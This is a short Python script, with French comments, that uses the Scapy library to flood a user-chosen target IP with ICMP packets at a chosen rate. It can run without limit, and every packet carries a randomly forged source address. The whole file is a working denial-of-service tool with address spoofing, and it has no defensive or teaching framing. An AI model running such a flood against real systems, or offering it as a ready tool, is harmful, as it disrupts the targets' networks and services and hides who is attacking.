from scapy.all import *
from scapy.layers.inet import IP, ICMP

# Saisie adresse IP cible et débit et nombre de paquets (temps)
target_ip = input("Enter the target IP address: ")
packet_rate = int(input("Enter the packet rate (packets per second): "))
packet_count = int(input("Enter the number of packets to send (-1 to send indefinitely): "))

# Generation aléatoire d'adresse IP Source
fake_source_ip = ".".join([str(random.randint(0, 255)) for i in range(4)])

send_packets = True

# Envoi des paquets
while send_packets:
    send(IP(src=fake_source_ip, dst=target_ip) / ICMP())
    time.sleep(1 / packet_rate)

    # Si le nombre de paquets est défini (pas -1), décrémentez le nombre et vérifiez s'il est temps d'arrêter l'envoi
    if packet_count > 0:
        packet_count -= 1
        if packet_count == 0:
            send_packets = False

print("Finished sending packets")
input("Press Enter to continue...")
